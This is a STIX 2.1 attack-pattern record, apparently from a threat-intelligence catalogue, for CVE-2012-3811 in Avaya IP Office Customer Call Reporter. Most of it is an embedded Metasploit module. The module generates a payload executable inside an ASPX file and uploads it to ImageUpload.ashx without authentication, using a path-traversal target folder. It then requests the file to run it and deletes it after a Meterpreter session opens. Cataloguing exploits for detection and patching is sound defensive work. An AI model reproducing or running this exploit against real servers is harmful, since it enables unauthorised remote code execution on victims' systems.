{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--132ca6de-569e-4df8-9f9f-799f53588459",
    "created": "2024-08-14T16:55:37.55044Z",
    "modified": "2024-08-14T16:55:37.550444Z",
    "name": "Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution",
    "description": " This module exploits an authentication bypass vulnerability on Avaya IP Office Customer Call Reporter, which allows a remote user to upload arbitrary files through the ImageUpload.ashx component. It can be abused to upload and execute arbitrary ASP .NET code. The vulnerability has been tested successfully on Avaya IP Office Customer Call Reporter 7.0.4.2 and 8.0.8.15 on Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/avaya_ccr_imageupload_exec.rb",
            "external_id": "avaya_ccr_imageupload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3811"
        },
        {
            "source_name": "reference",
            "url": "https://downloads.avaya.com/css/P8/documents/100164021"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'           => 'Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution',\n      'Description'    => %q{\n          This module exploits an authentication bypass vulnerability on Avaya IP Office\n        Customer Call Reporter, which allows a remote user to upload arbitrary files\n        through the ImageUpload.ashx component. It can be abused to upload and execute\n        arbitrary ASP .NET code. The vulnerability has been tested successfully on Avaya IP\n        Office Customer Call Reporter 7.0.4.2 and 8.0.8.15 on Windows 2003 SP2.\n      },\n      'Author'      =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          [ 'CVE', '2012-3811' ],\n          [ 'OSVDB', '83399' ],\n          [ 'BID', '54225' ],\n          [ 'URL', 'https://downloads.avaya.com/css/P8/documents/100164021' ],\n          [ 'ZDI', '12-106' ]\n        ],\n      'Targets'     =>\n        [\n          [ 'Avaya IP Office Customer Call Reporter 7.0 and 8.0 / Microsoft Windows Server 2003 SP2', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => 'Jun 28 2012'\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path of the Avaya CCR applications', '/'])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  #\n  # Remove the .aspx if we get a meterpreter.\n  #\n  def on_new_session(cli)\n    if cli.type != 'meterpreter'\n      print_error(\"Meterpreter not used. Please manually remove #{@payload_path}\")\n      return\n    end\n\n    cli.core.use(\"stdapi\") if not cli.ext.aliases.include?(\"stdapi\")\n\n    begin\n      print_warning(\"Removing #{@payload_path}\")\n      cli.fs.file.rm(@payload_path)\n      print_good(\"#{@payload_path} deleted\")\n    rescue ::Exception => e\n      print_error(\"Unable to delete #{@payload_path}: #{e.message}\")\n    end\n  end\n\n\n  def exploit\n    # Generate the ASPX containing the EXE containing the payload\n    exe = generate_payload_exe\n    aspx = Msf::Util::EXE.to_exe_aspx(exe)\n    aspx_b64 = Rex::Text.encode_base64(aspx)\n\n    uri_path = target_uri.path\n    uri_path.path << \"/\" if uri_path[-1, 1] != \"/\"\n\n    boundary = \"---------------------------#{rand_text_alpha(36)}\"\n\n    my_data = \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"RadUAG_fileName\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"#{rand_text_alpha(rand(5)+3)}.aspx\\r\\n\"\n    my_data << \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"RadUAG_data\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"#{aspx_b64}\\r\\n\"\n    my_data << \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"RadUAG_targetFolder\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"../../CCRWallboardMessageBroker/\\r\\n\"\n    my_data << \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"RadUAG_position\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"0\\r\\n\"\n    my_data << \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"RadUAG_targetPhysicalFolder\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"RadUAG_overwriteExistingFiles\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"True\\r\\n\"\n    my_data << \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"RadUAG_finalFileRequest\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"True\\r\\n\"\n    my_data << \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"UploadImageType\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"0\\r\\n\"\n    my_data << \"--#{boundary}\\r\\n\"\n    my_data << \"Content-Disposition: form-data; name=\\\"WallboardID\\\"\\r\\n\"\n    my_data << \"\\r\\n\"\n    my_data << \"0\\r\\n\"\n    my_data << \"--#{boundary}--\\r\\n\"\n\n    #\n    # UPLOAD\n    #\n    attack_url = uri_path + \"CCRWebClient/Wallboard/ImageUpload.ashx\"\n    print_status(\"Uploading #{aspx_b64.length} bytes through #{attack_url}...\")\n\n    res = send_request_cgi({\n      'uri'          => attack_url,\n      'method'       => 'POST',\n      'ctype'  => \"multipart/form-data; boundary=#{boundary}\",\n      'data'         => my_data,\n    }, 20)\n\n    payload_url = \"\"\n    @payload_path = \"\"\n    if res and res.code == 200 and res.body =~ /\"Key\":\"RadUAG_success\",\"Value\":true/\n      print_good(\"Payload uploaded successfully\")\n    else\n      print_error(\"Payload upload failed\")\n      return\n    end\n\n    # Retrieve info about the uploaded payload\n\n    if res.body =~ /\\{\"Key\":\"RadUAG_filePath\",\"Value\":\"(.*)\"\\},\\{\"Key\":\"RadUAG_associatedData/\n      @payload_path = $1\n      print_status(\"Payload stored on #{@payload_path}\")\n    else\n      print_error(\"The payload file path couldn't be retrieved\")\n    end\n\n    if res.body =~ /\\[\\{\"Key\":\"UploadedImageURL\",\"Value\":\"(.*)\"\\}\\]/\n      payload_url = URI($1).path\n    else\n      print_error(\"The payload URI couldn't be retrieved... Aborting!\")\n      return\n    end\n\n\n    #\n    # EXECUTE\n    #\n    print_status(\"Executing #{payload_url}...\")\n\n    res = send_request_cgi({\n      'uri'          =>  payload_url,\n      'method'       => 'GET'\n    }, 20)\n\n    if (!res or (res and res.code != 200))\n      print_error(\"Execution failed on #{payload_url} [No Response]\")\n      return\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "Jun 28 2012",
    "x_mitre_platforms": [
        "win'"
    ]
}